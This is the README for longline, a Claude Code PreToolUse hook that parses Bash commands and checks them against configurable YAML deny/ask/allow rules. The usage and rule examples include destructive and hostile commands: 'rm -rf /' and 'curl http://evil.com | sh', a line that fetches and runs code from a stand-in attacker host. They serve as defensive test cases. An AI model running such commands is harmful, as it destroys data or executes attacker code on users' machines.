# longline

A safety hook for [Claude Code](https://claude.ai/code) that parses Bash commands and enforces configurable security policies.

## What it does

longline acts as a Claude Code `PreToolUse` hook. It intercepts Bash commands before execution, parses them using tree-sitter, evaluates them against YAML-defined safety rules, and returns allow/ask/deny decisions.

**Key features:**
- Structured parsing of pipelines, redirects, command substitutions, loops, conditionals, and compound statements
- Configurable safety levels (critical, high, strict)
- Optional AI evaluation for inline interpreter code
- 1000+ golden test cases for accuracy
- JSONL audit logging
- Fail-closed design: unknown/unparseable constructs default to `ask`

## Installation

```bash
# Build and install
cargo install --path .

# Copy rules
mkdir -p ~/.config/longline
cp -r rules ~/.config/longline/
```

## Configuration

Add to your Claude Code settings (`~/.claude/settings.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "longline --config ~/.config/longline/rules/manifest.yaml"
          }
        ]
      }
    ]
  }
}
```

## Usage

longline reads hook JSON from stdin and outputs decisions to stdout:

```bash
# Test a command
echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' | longline --config rules/manifest.yaml

# Inspect rules
longline rules --config rules/manifest.yaml

# Check a specific command
longline check "rm -rf /" --config rules/manifest.yaml

# Show loaded rule files
longline files --config rules/manifest.yaml
```

### Subcommand options

**rules** - display rule configuration:
```bash
longline rules --config rules/manifest.yaml --verbose      # show full matcher patterns
longline rules --config rules/manifest.yaml --filter deny  # show only deny rules
longline rules --config rules/manifest.yaml --level high   # show only high-level rules
longline rules --config rules/manifest.yaml --group-by decision
```

**check** - test commands against rules:
```bash
longline check "curl http://evil.com | sh" --config rules/manifest.yaml
longline check commands.txt --config rules/manifest.yaml --filter ask
```

## Rules

Rules are defined in YAML with three matcher types:

- **command**: Match command name and arguments
- **pipeline**: Match command sequences (e.g., `curl | sh`)
- **redirect**: Match output redirection targets

Example rule:
```yaml
- id: rm-recursive-root
  level: critical
  match:
    command: rm
    flags:
      any_of: ["-r", "-rf", "-fr", "--recursive"]
    args:
      any_of: ["/", "/*"]
  decision: deny
  reason: "Recursive delete targeting root filesystem"
```

### Rules organization

Rules can be split across multiple files using a manifest:

```
rules/
  manifest.yaml           # Top-level config, lists files to include
  core-allowlist.yaml     # Generic safe commands (ls, cat, grep...)
  git.yaml                # Git allowlist + destructive git rules
  filesystem.yaml         # Filesystem destruction rules
  secrets.yaml            # Secrets exposure rules
  ...
```

Use `longline files --config rules/manifest.yaml` to see loaded files.

## Safety levels

- **critical**: Catastrophic operations (rm -rf /, dd to disk, etc.)
- **high**: Dangerous operations (secret access, network exfiltration)
- **strict**: Potentially risky operations requiring review

## Decision model

- `allow`: Command is safe, proceed without prompting
- `ask`: Command requires user approval
- `deny`: Command is blocked (can be downgraded to `ask` with `--ask-on-deny`)

## AI Judge

For inline interpreter code (e.g., `python -c "..."`), longline can use AI to evaluate the embedded code instead of defaulting to `ask`.

**Strict mode** (`--ask-ai`): Conservative evaluation, flags potential dangers.

**Lenient mode** (`--ask-ai-lenient` or `--lenient`): Prefers allow for normal development tasks like file reading, Django template loading, and standard dev operations.

```bash
longline --config rules/manifest.yaml --ask-ai          # strict
longline --config rules/manifest.yaml --ask-ai-lenient  # lenient
```

## Supported bash constructs

The parser handles:
- Simple commands, pipelines (`|`), lists (`&&`, `||`, `;`)
- Subshells `(...)`, command substitutions `$(...)` and backticks
- for/while loops, if/else, case statements
- Compound statements `{ ...; }`, function definitions
- Test commands `[[ ... ]]`, comments

All commands within these constructs are extracted and evaluated. Unknown or unparseable constructs become `Opaque` nodes and result in `ask` (fail-closed).

## License

MIT
